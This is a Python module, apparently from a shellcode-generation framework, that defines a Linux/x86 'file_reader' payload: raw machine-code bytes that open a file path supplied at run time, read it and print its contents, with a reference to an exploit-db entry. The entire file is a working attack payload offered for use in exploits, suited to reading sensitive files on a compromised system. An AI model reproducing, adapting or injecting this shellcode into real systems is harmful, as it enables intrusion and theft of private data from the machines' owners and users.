from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "B3mB4m"
    Shellcode.info["name"] = "Linux/x86 - file_reader shellcode"
    Shellcode.info["references"] = [
        "https://www.exploit-db.com/exploits/37297/"
    ]

    def __init__(self, **kwargs): 
        Shellcode.info["size"] = 43 + Shellcode().getsize(kwargs["file"])
        Shellcode.info["payload"] = [
            r"\x31\xc9\x31\xc0\x31\xd2\x51\xb0\x05"	
            + kwargs["file"] +
            r"\x89\xe3\xcd\x80\x89\xd9\x89\xc3\xb0"
            r"\x03\x66\xba\xff\x0f\x66\x42\xcd\x80"
            r"\x31\xc0\x31\xdb\xb3\x01\xb0\x04\xcd"
            r"\x80\x31\xc0\xb0\x01\xcd\x80"
        ]
